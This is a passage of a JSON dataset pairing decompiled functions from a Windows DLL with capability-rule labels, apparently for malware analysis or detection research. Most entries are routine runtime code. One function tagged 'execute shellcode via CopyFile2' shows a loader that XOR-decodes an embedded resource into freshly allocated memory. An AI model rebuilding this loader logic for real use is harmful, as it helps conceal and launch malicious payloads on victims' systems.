            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t fcn.180054c7c(uint16_t *arg1, char **arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    char *pcVar3;\n    char *arg2_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint32_t auStackX8 [2];\n    int64_t in_stack_00000028;\n    \n    arg2_00 = *arg2;\n    iVar4 = 0;\n    if (arg1 == NULL) {\n        while( true ) {\n            if (*arg2_00 == '\\0') {\n                iVar5 = 1;\n            }\n            else if (arg2_00[1] == '\\0') {\n                iVar5 = 2;\n            }\n            else {\n                iVar5 = (arg2_00[2] != '\\0') + 3;\n            }\n            iVar5 = fcn.180059ee8(0, arg2_00, iVar5, arg4);\n            if (iVar5 == -1) {\n                *(in_stack_00000028 + 0x30) = 1;\n                *(in_stack_00000028 + 0x2c) = 0x2a;\n                return -1;\n            }\n            if (iVar5 == 0) break;\n            if (iVar5 == 4) {\n                iVar4 = iVar4 + 1;\n            }\n            arg2_00 = arg2_00 + iVar5;\n            iVar4 = iVar4 + 1;\n        }\n    }\n    else {\n        puVar2 = arg1;\n        pcVar3 = arg2_00;\n        if (arg3 != 0) {\n            do {\n                if (*arg2_00 == '\\0') {\n                    iVar4 = 1;\n                }\n                else if (arg2_00[1] == '\\0') {\n                    iVar4 = 2;\n                }\n                else {\n                    iVar4 = (arg2_00[2] != '\\0') + 3;\n                }\n                iVar4 = fcn.180059ee8(auStackX8, arg2_00, iVar4, arg4);\n                if (iVar4 == -1) {\n                    *arg2 = arg2_00;\n                    *(in_stack_00000028 + 0x30) = 1;\n                    *(in_stack_00000028 + 0x2c) = 0x2a;\n                    return -1;\n                }\n                pcVar3 = NULL;\n                if (iVar4 == 0) {\n                    *puVar2 = 0;\n                    break;\n                }\n                uVar1 = auStackX8[0];\n                if (0xffff < auStackX8[0]) {\n                    pcVar3 = arg2_00;\n                    if (arg3 < 2) break;\n                    auStackX8[0] = auStackX8[0] - 0x10000;\n                    arg3 = arg3 - 1;\n                    *puVar2 = auStackX8[0] >> 10 | 0xd800;\n                    puVar2 = puVar2 + 1;\n                    uVar1 = auStackX8[0] & 0x3ff | 0xdc00;\n                }\n                *puVar2 = uVar1;\n                pcVar3 = arg2_00 + iVar4;\n                puVar2 = puVar2 + 1;\n                arg3 = arg3 - 1;\n                arg2_00 = pcVar3;\n            } while (arg3 != 0);\n        }\n        *arg2 = pcVar3;\n        iVar4 = puVar2 - arg1 >> 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 819
    },
    "180058e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.180058e18(ulong param_1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x180072760 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x1800711e8;\n        var_28h._4_4_ = *0x1800711ec;\n        uStack40 = *0x1800711f0;\n        uStack36 = *0x1800711f4;\n    }\n    uVar1 = fcn.180058c60(param_1, &var_40h);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.180014ed0(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.180014ed0(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 433
    },
    "180059ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.180059ee8(uint64_t arg1, uint8_t *arg2, uint64_t arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    uint8_t *puVar5;\n    uint8_t uVar6;\n    uint64_t uVar7;\n    uint32_t *arg1_00;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    ulong in_stack_00000028;\n    uchar auStack120 [24];\n    uint32_t auStack96 [6];\n    uint64_t uStack72;\n    \n    uStack72 = *0x180071010 ^ auStack120;\n    arg1_00 = 0x180073688;\n    if (arg4 != NULL) {\n        arg1_00 = arg4;\n    }\n    puVar5 = 0x18005de62;\n    if (arg2 != NULL) {\n        puVar5 = arg2;\n    }\n    uVar9 = 1;\n    if (arg2 != NULL) {\n        uVar9 = arg3;\n    }\n    puVar8 = -(arg2 != NULL) & arg1;\n    if (uVar9 == 0) goto code_r0x00018005a0a5;\n    if (*(arg1_00 + 6) == 0) {\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n        if (-1 < uVar3) {\n            if (puVar8 != NULL) {\n                *puVar8 = uVar3;\n            }\n            goto code_r0x00018005a0a5;\n        }\n        if ((uVar3 & 0xe0) == 0xc0) {\n            uVar6 = 2;\n        }\n        else if ((uVar3 & 0xf0) == 0xe0) {\n            uVar6 = 3;\n        }\n        else {\n            if ((uVar3 & 0xf8) != 0xf0) goto code_r0x00018005a09a;\n            uVar6 = 4;\n        }\n        uVar2 = (1 << (7 - uVar6 & 0x1f)) - 1U & uVar3;\n        uVar3 = uVar6;\ncode_r0x000180059ff0:\n        uVar4 = uVar3;\n        uVar7 = uVar3;\n        if (uVar9 <= uVar4) {\n            uVar7 = uVar9;\n        }\n        while (puVar5 - arg2 < uVar7) {\n            uVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n            if ((uVar1 & 0xc0) != 0x80) goto code_r0x00018005a09a;\n            uVar2 = uVar1 & 0x3f | uVar2 << 6;\n        }\n        if (uVar7 < uVar4) {\n            *(arg1_00 + 1) = uVar6;\n            *(arg1_00 + 6) = uVar3 - uVar7;\n            *arg1_00 = uVar2;\n            goto code_r0x00018005a0a5;\n        }\n        if ((0x7ff < uVar2 - 0xd800) && (uVar2 < 0x110000)) {\n            auStack96[2] = 0x80;\n            auStack96[3] = 0x800;\n            auStack96[4] = 0x10000;\n            if (auStack96[uVar6] <= uVar2) {\n                if (puVar8 != NULL) {\n                    *puVar8 = uVar2;\n                }\n                fcn.180059ecc(-(uVar2 != 0) & uVar4, arg1_00);\n                goto code_r0x00018005a0a5;\n            }\n        }\n    }\n    else {\n        uVar6 = *(arg1_00 + 1);\n        uVar2 = *arg1_00;\n        uVar3 = *(arg1_00 + 6);\n        if (((uVar6 - 2 < 3) && (uVar3 != 0)) && (uVar3 < uVar6)) goto code_r0x000180059ff0;\n    }\ncode_r0x00018005a09a:\n    fcn.180059ed4(arg1_00, in_stack_00000028);\ncode_r0x00018005a0a5:\n    fcn.180002200(uStack72 ^ auStack120);\n    return;\n}\n",
        "token_count": 1046
    },
    "18005abe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18005abe8(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    uint64_t uVar6;\n    \n    uVar6 = arg1;\n    iVar3 = fcn.18004fdc8(uVar6 & 0xffffffff);\n    if (iVar3 != -1) {\n        if (((arg1 == 1) && ((*(*0x180072bb0 + 200) & 1) != 0)) || ((arg1 == 2 && ((*(*0x180072bb0 + 0x80) & 1) != 0))))\n        {\n            iVar3 = fcn.18004fdc8(2);\n            iVar4 = fcn.18004fdc8(1);\n            if (iVar4 == iVar3) goto code_r0x00018005ac0a;\n        }\n        fcn.18004fdc8(uVar6 & 0xffffffff);\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x00018005ac68;\n        }\n    }\ncode_r0x00018005ac0a:\n    uVar2 = 0;\ncode_r0x00018005ac68:\n    fcn.18004fd0c(uVar6 & 0xffffffff);\n    *(*((uVar6 >> 6) * 8 + 0x180072bb0) + 0x38 + (arg1 & 0x3f) * 0x48) = 0;\n    if (uVar2 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        fcn.18003c3a4(uVar2, arg2);\n        uVar5 = 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 439
    },
    "180001d4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180001d44(ulong arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uchar auStack808 [32];\n    uint uStack776;\n    uint uStack768;\n    uint64_t uStack760;\n    int64_t iStack752;\n    int64_t iStack744;\n    ulong uStack736;\n    ulong uStack728;\n    int64_t iStack720;\n    ulong uStack712;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180071010 ^ auStack808;\n    uVar3 = 0;\n    uStack712 = 0x409;\n    iStack752 = 0;\n    uStack728 = 0x1800680a8;\n    iStack720 = arg1;\n    iStack744 = 0;\n    uStack760 = 0;\n    (*_sym.imp.ntdll.dll_LdrFindResource_U)(0x180000000, &uStack728, 3, &uStack736);\n    (*_sym.imp.ntdll.dll_LdrAccessResource)(0x180000000, uStack736, &iStack744, &uStack760);\n    uStack768 = fcn.180015f40(0x1800680b8);\n    uStack776 = 0x3000;\n    (*_sym.imp.ntdll.dll_NtAllocateVirtualMemory)();\n    uVar4 = uVar3;\n    if (uStack760 != 0) {\n        do {\n            iVar1 = uVar3;\n            uVar2 = iVar1 + 1;\n            uVar3 = uVar2;\n            *(uVar4 + iStack752) = *(iVar1 % 0x23 + 0x180068080) ^ *(uVar4 + iStack744);\n            uVar4 = uVar4 + 1;\n        } while (uVar2 < uStack760);\n    }\n    *arg2 = iStack752;\n    fcn.180002200(uStack24 ^ auStack808);\n    return;\n}\n",
        "token_count": 466
    },
    "18004214": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.18004214c(ulong arg1, ulong noname_1, int64_t arg3, ulong *arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint *arg2;\n    uint *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    int64_t iVar18;\n    int64_t iVar19;\n    int64_t iStackX24;\n    ulong *puStackX32;\n    uchar auStack616 [4];\n    uint uStack612;\n    uint auStack608 [2];\n    int64_t *piStack600;\n    ulong **ppuStack592;\n    uint auStack584 [140];\n    \n    iStackX24 = arg3;\n    puStackX32 = arg4;\n    fcn.1800423bc(arg3, arg4);\n    uVar13 = fcn.180041e3c(arg1);\n    if (uVar13 == *(*(iStackX24 + 0x88) + 4)) {\n        iVar14 = 0;\n    }\n    else {\n        arg2 = fcn.180047050(0x228);\n        if (arg2 == NULL) {\n            fcn.18003fb14(0);\n            iVar14 = -1;\n        }\n        else {\n            iVar18 = 4;\n            iVar19 = 4;\n            puVar16 = *(iStackX24 + 0x88);\n            puVar12 = auStack584;\n            do {\n                puVar17 = puVar12;\n                puVar15 = puVar16;\n                uVar4 = puVar15[1];\n                uVar5 = puVar15[2];\n                uVar6 = puVar15[3];\n                uVar7 = puVar15[4];\n                uVar8 = puVar15[5];\n                uVar9 = puVar15[6];\n                uVar10 = puVar15[7];\n                *puVar17 = *puVar15;\n                puVar17[1] = uVar4;\n                puVar17[2] = uVar5;\n                puVar17[3] = uVar6;\n                uVar4 = puVar15[8];\n                uVar5 = puVar15[9];\n                uVar6 = puVar15[10];\n                uVar11 = puVar15[0xb];\n                puVar17[4] = uVar7;\n                puVar17[5] = uVar8;\n                puVar17[6] = uVar9;\n                puVar17[7] = uVar10;\n                uVar7 = puVar15[0xc];\n                uVar8 = puVar15[0xd];\n                uVar9 = puVar15[0xe];\n                uVar10 = puVar15[0xf];\n                puVar17[8] = uVar4;\n                puVar17[9] = uVar5;\n                puVar17[10] = uVar6;\n                puVar17[0xb] = uVar11;\n                uVar4 = puVar15[0x10];\n                uVar5 = puVar15[0x11];\n                uVar6 = puVar15[0x12];\n                uVar11 = puVar15[0x13];\n                puVar17[0xc] = uVar7;\n                puVar17[0xd] = uVar8;\n                puVar17[0xe] = uVar9;\n                puVar17[0xf] = uVar10;\n                uVar7 = puVar15[0x14];\n                uVar8 = puVar15[0x15];\n                uVar9 = puVar15[0x16];\n                uVar10 = puVar15[0x17];\n                puVar17[0x10] = uVar4;\n                puVar17[0x11] = uVar5;\n                puVar17[0x12] = uVar6;\n                puVar17[0x13] = uVar11;\n                uVar4 = puVar15[0x18];\n                uVar5 = puVar15[0x19];\n                uVar6 = puVar15[0x1a];\n                uVar11 = puVar15[0x1b];\n                puVar17[0x14] = uVar7;\n                puVar17[0x15] = uVar8;\n                puVar17[0x16] = uVar9;\n                puVar17[0x17] = uVar10;\n                uVar7 = puVar15[0x1c];\n                uVar8 = puVar15[0x1d];\n                uVar9 = puVar15[0x1e];\n                uVar10 = puVar15[0x1f];\n                puVar17[0x18] = uVar4;\n                puVar17[0x19] = uVar5;\n                puVar17[0x1a] = uVar6;\n                puVar17[0x1b] = uVar11;\n                puVar17[0x1c] = uVar7;\n                puVar17[0x1d] = uVar8;\n                puVar17[0x1e] = uVar9;\n                puVar17[0x1f] = uVar10;\n                iVar19 = iVar19 + -1;\n                puVar16 = puVar15 + 0x20;\n                puVar12 = puVar17 + 0x20;\n            } while (iVar19 != 0);\n            uVar4 = puVar15[0x21];\n            uVar5 = puVar15[0x22];\n            uVar6 = puVar15[0x23];\n            uVar7 = puVar15[0x24];\n            uVar8 = puVar15[0x25];\n            uVar9 = puVar15[0x26];\n            uVar10 = puVar15[0x27];\n            uVar2 = *(puVar15 + 0x28);\n            puVar17[0x20] = puVar15[0x20];\n            puVar17[0x21] = uVar4;\n            puVar17[0x22] = uVar5;\n            puVar17[0x23] = uVar6;\n            puVar17[0x24] = uVar7;\n            puVar17[0x25] = uVar8;\n            puVar17[0x26] = uVar9;\n            puVar17[0x27] = uVar10;\n            *(puVar17 + 0x28) = uVar2;\n            puVar16 = auStack584;\n            puVar12 = arg2;\n            do {\n                puVar17 = puVar12;\n                puVar15 = puVar16;\n                uVar4 = puVar15[1];\n                uVar5 = puVar15[2];\n                uVar6 = puVar15[3];\n                uVar7 = puVar15[4];\n                uVar8 = puVar15[5];\n                uVar9 = puVar15[6];\n                uVar10 = puVar15[7];\n                *puVar17 = *puVar15;\n                puVar17[1] = uVar4;\n                puVar17[2] = uVar5;\n                puVar17[3] = uVar6;\n                uVar4 = puVar15[8];\n                uVar5 = puVar15[9];\n                uVar6 = puVar15[10];\n                uVar11 = puVar15[0xb];\n                puVar17[4] = uVar7;\n                puVar17[5] = uVar8;\n                puVar17[6] = uVar9;\n                puVar17[7] = uVar10;\n                uVar7 = puVar15[0xc];\n                uVar8 = puVar15[0xd];\n                uVar9 = puVar15[0xe];\n                uVar10 = puVar15[0xf];\n                puVar17[8] = uVar4;\n                puVar17[9] = uVar5;\n                puVar17[10] = uVar6;\n                puVar17[0xb] = uVar11;\n                uVar4 = puVar15[0x10];\n                uVar5 = puVar15[0x11];\n                uVar6 = puVar15[0x12];\n                uVar11 = puVar15[0x13];\n                puVar17[0xc] = uVar7;\n                puVar17[0xd] = uVar8;\n                puVar17[0xe] = uVar9;\n                puVar17[0xf] = uVar10;\n                uVar7 = puVar15[0x14];\n                uVar8 = puVar15[0x15];\n                uVar9 = puVar15[0x16];\n                uVar10 = puVar15[0x17];\n                puVar17[0x10] = uVar4;\n                puVar17[0x11] = uVar5;\n                puVar17[0x12] = uVar6;\n                puVar17[0x13] = uVar11;\n                uVar4 = puVar15[0x18];\n                uVar5 = puVar15[0x19];\n                uVar6 = puVar15[0x1a];\n                uVar11 = puVar15[0x1b];\n                puVar17[0x14] = uVar7;\n                puVar17[0x15] = uVar8;\n                puVar17[0x16] = uVar9;\n                puVar17[0x17] = uVar10;\n                uVar7 = puVar15[0x1c];\n                uVar8 = puVar15[0x1d];\n                uVar9 = puVar15[0x1e];\n                uVar10 = puVar15[0x1f];\n                puVar17[0x18] = uVar4;\n                puVar17[0x19] = uVar5;\n                puVar17[0x1a] = uVar6;\n                puVar17[0x1b] = uVar11;\n                puVar17[0x1c] = uVar7;\n                puVar17[0x1d] = uVar8;\n                puVar17[0x1e] = uVar9;\n                puVar17[0x1f] = uVar10;\n                iVar18 = iVar18 + -1;\n                puVar16 = puVar15 + 0x20;\n                puVar12 = puVar17 + 0x20;\n            } while (iVar18 != 0);\n            uVar4 = puVar15[0x21];\n            uVar5 = puVar15[0x22];\n            uVar6 = puVar15[0x23];\n            uVar7 = puVar15[0x24];\n            uVar8 = puVar15[0x25];\n            uVar9 = puVar15[0x26];\n            uVar10 = puVar15[0x27];\n            uVar2 = *(puVar15 + 0x28);\n            puVar17[0x20] = puVar15[0x20];\n            puVar17[0x21] = uVar4;\n            puVar17[0x22] = uVar5;\n            puVar17[0x23] = uVar6;\n            puVar17[0x24] = uVar7;\n            puVar17[0x25] = uVar8;\n            puVar17[0x26] = uVar9;\n            puVar17[0x27] = uVar10;\n            *(puVar17 + 0x28) = uVar2;\n            *arg2 = 0;\n            iVar14 = fcn.180042568(uVar13, arg2);\n            if (iVar14 == -1) {\n                puVar16 = fcn.18003c3e8();\n                *puVar16 = 0x16;\n                fcn.18003fb14(arg2);\n                iVar14 = -1;\n            }\n            else {\n                if (noname_1 == '\\0') {\n                    fcn.18003dcc4();\n                }\n                piVar3 = *(iStackX24 + 0x88);\n                LOCK();\n                iVar1 = *piVar3;\n                *piVar3 = *piVar3 + -1;\n                if ((iVar1 == 1) && (*(iStackX24 + 0x88) != 0x180071200)) {\n                    fcn.18003fb14(*(iStackX24 + 0x88));\n                }\n                *arg2 = 1;\n                *(iStackX24 + 0x88) = arg2;\n                if ((*0x1800718a4 & *(iStackX24 + 0x3a8)) == 0) {\n                    piStack600 = &iStackX24;\n                    ppuStack592 = &puStackX32;\n                    uStack612 = 5;\n                    auStack608[0] = 5;\n                    fcn.180041a2c(auStack616, auStack608, &piStack600, &uStack612);\n                    if (noname_1 != '\\0') {\n                        *0x1800711f0 = *puStackX32;\n                    }\n                }\n                fcn.18003fb14(0);\n            }\n        }\n    }\n    return iVar14;\n}\n",
        "token_count": 3031
    },
    "18000494": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.180004940(uchar (*arg1) [16], ulong noname_1, uint64_t arg3)\n\n{\n    uchar (*pauVar1) [16];\n    uchar (*pauVar2) [16];\n    uint16_t uVar3;\n    uint64_t uVar5;\n    uchar auVar6 [12];\n    uint32_t uVar4;\n    uchar auVar7 [13];\n    uchar auVar8 [16];\n    uchar uVar9;\n    \n    uVar5 = noname_1 * 0x101010101010101;\n    uVar3 = uVar5;\n    uVar4 = uVar5;\n    if (arg3 < 0x11) {\n        uVar9 = uVar5;\n    // switch table (17 cases) at 0x180079000\n        switch(*(arg3 * 4 + 0x180079000) + 0x180000000) {\n        case 0x180004a70:\n            *(arg1[-1] + arg3 + 1) = uVar5;\n        case 0x180004a74:\n            *(arg1[-1] + arg3 + 9) = uVar4;\n        case 0x180004a77:\n            *(arg1[-1] + arg3 + 0xd) = uVar3;\n        case 0x180004a7b:\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x180004a7e:\n            return arg1;\n        case 0x180004a80:\n            *(arg1[-1] + arg3 + 4) = uVar5;\n        case 0x180004a84:\n            *(arg1[-1] + arg3 + 0xc) = uVar4;\n            return arg1;\n        case 0x180004a88:\n            *(arg1[-1] + arg3 + 7) = uVar5;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x180004a90:\n            *(arg1[-1] + arg3 + 3) = uVar5;\n        case 0x180004a94:\n            *(arg1[-1] + arg3 + 0xb) = uVar4;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x180004aa0:\n            *(arg1[-1] + arg3 + 2) = uVar5;\n        case 0x180004aa4:\n            *(arg1[-1] + arg3 + 10) = uVar4;\n        case 0x180004aa7:\n            *(arg1[-1] + arg3 + 0xe) = uVar3;\n            return arg1;\n        case 0x180004aac:\n            **arg1 = uVar5;\n            return arg1;\n        case 0x180004ab0:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar9;\n            return arg1;\n        case 0x180004ac0:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            return arg1;\n        case 0x180004ac8:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar5;\n            return arg1;\n        }\n    }\n    uVar9 = SUB141(ZEXT814(uVar5) >> 0x30, 0);\n    auVar7 = ZEXT813(uVar5);\n    auVar6 = ZEXT812(uVar5);\n    auVar8 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(SUB161(ZEXT816(uVar5) >> 0x38, 0), \n                                                                      CONCAT114(SUB151(ZEXT815(uVar5) >> 0x38, 0), \n                                                                                ZEXT814(uVar5))) >> 0x70, 0), \n                                                            CONCAT113(uVar9, auVar7)) >> 0x68, 0), \n                                                            CONCAT112(uVar9, auVar6)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar7 >> 0x28, 0), ZEXT811(uVar5))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar6 >> 0x28, 0), uVar5)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar7 >> 0x20, 0), uVar5)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar6 >> 0x20, 0), uVar5)) >>\n                                                            0x40, 0), (uVar5 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar5 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar5 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar5 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                 >> 0x18, 0), (uVar5 >> 8) << 0x10) >> 0x10, 0), \n                       uVar3 & 0xff | uVar3 << 8);\n    pauVar1 = arg1;\n    if (0x80 < arg3) {\n        if ((*0x180072220 & 2) != 0) {\n            for (; arg3 != 0; arg3 = arg3 - 1) {\n                (*pauVar1)[0] = noname_1;\n                pauVar1 = *pauVar1 + 1;\n            }\n            return arg1;\n        }\n        *arg1 = auVar8;\n        pauVar1 = arg1[1] & 0xfffffffffffffff0;\n        arg3 = arg1 + (arg3 - pauVar1);\n        uVar5 = arg3 >> 7;\n        if (uVar5 != 0) {\n            if (*0x180071028 < uVar5) {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n            else {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n        }\n    }\n    for (uVar5 = arg3 >> 4; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *pauVar1 = auVar8;\n        pauVar1 = pauVar1[1];\n    }\n    if ((arg3 & 0xf) != 0) {\n        *(pauVar1[-1] + (arg3 & 0xf)) = auVar8;\n    }\n    return arg1;\n}\n",
        "token_count": 1929
    },
    "1800052a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.1800052a0(void)\n\n{\n    if (*0x180071030 != 0xffffffff) {\n        fcn.180011da4(*0x180071030);\n        *0x180071030 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 62
    },
    "18003d0a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.18003d0a4(ulong noname_0, ulong lpFlsData)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    if ((*0x180071078 == -1) || (iVar3 = sub.KERNEL32.dll_FlsGetValue(),  iVar3 == 0)) {\n        iVar2 = sub.KERNEL32.dll_FlsSetValue(*0x180071078, 0xffffffffffffffff);\n        if (iVar2 != 0) {\n            iVar3 = fcn.18003fa94(1, 0x3c8);\n            if (iVar3 == 0) {\n                sub.KERNEL32.dll_FlsSetValue(*0x180071078, 0);\n                iVar3 = 0;\n            }\n            else {\n                iVar2 = sub.KERNEL32.dll_FlsSetValue(*0x180071078, iVar3);\n                if (iVar2 != 0) {\n                    fcn.18003c9d4(iVar3);\n                    fcn.18003fb14(0);\n                    return iVar3;\n                }\n                sub.KERNEL32.dll_FlsSetValue(*0x180071078, 0);\n            }\n            fcn.18003fb14(iVar3);\n        }\n    }\n    else if (iVar3 != -1) {\n        return iVar3;\n    }\n    fcn.1800188ac();\n    pcVar1 = swi(3);\n    iVar3 = (*pcVar1)();\n    return iVar3;\n}\n",
        "token_count": 332
    },
    "18003d21": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.18003d210(ulong noname_0, int64_t lpFlsData)\n\n{\n    int32_t iVar1;\n    int64_t arg1;\n    int64_t iVar2;\n    \n    iVar2 = 0;\n    if ((*0x180071078 == -1) || (arg1 = sub.KERNEL32.dll_FlsGetValue(),  arg1 == 0)) {\n        iVar1 = sub.KERNEL32.dll_FlsSetValue(*0x180071078, 0xffffffffffffffff);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        arg1 = fcn.18003fa94(1, 0x3c8);\n        if (arg1 == 0) {\n            sub.KERNEL32.dll_FlsSetValue(*0x180071078, 0);\n            arg1 = 0;\n        }\n        else {\n            iVar1 = sub.KERNEL32.dll_FlsSetValue(*0x180071078, arg1);\n            if (iVar1 != 0) {\n                fcn.18003c9d4(arg1);\n                fcn.18003fb14(0);\n                goto code_r0x00018003d2b1;\n            }\n            sub.KERNEL32.dll_FlsSetValue(*0x180071078, 0);\n        }\n        fcn.18003fb14(arg1);\n    }\n    else {\n        if (arg1 == -1) {\n            return 0;\n        }\ncode_r0x00018003d2b1:\n        iVar2 = lpFlsData * 0x3c8 + arg1;\n    }\n    return iVar2;\n}\n",
        "token_count": 358
    },
    "18003d30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.18003d30c(void)\n\n{\n    if (*0x180071078 != -1) {\n        sub.KERNEL32.dll_FlsFree();\n        *0x180071078 = -1;\n    }\n    return 1;\n}\n",
        "token_count": 55
    },
    "180050fc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
